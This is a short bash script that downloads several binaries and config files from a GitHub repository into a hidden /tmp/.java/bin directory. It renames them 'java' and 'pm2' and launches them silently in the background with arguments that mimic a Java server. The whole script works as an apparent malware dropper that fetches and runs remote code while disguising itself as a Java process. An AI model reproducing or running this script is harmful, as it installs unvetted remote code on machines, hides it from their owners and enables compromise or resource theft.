#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin/{a,b,c}
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-amd64 -o pm2
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/debyte/n0.conf -o cfg.conf
    cd /tmp/.java/bin/a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
    cd /tmp/.java/bin/b && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o java
    cd /tmp/.java/bin/b && curl -LO https://github.com/i51jir6ni9t0/backup/raw/master/tmp/debyte/conf.json
    cp /tmp/.java/bin/pm2 /tmp/.java/bin/a/pm2
    cp /tmp/.java/bin/pm2 /tmp/.java/bin/b/pm2
}

function start_app() {
    chmod a+x /tmp/.java/bin/*** /tmp/.java/bin/a/** /tmp/.java/bin/b/**
    cd /tmp/.java/bin && nohup ./pm2 -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./java -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/a/java" ] && [ -f "/tmp/.java/bin/b/java" ] && [ -f "/tmp/.java/bin/java" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
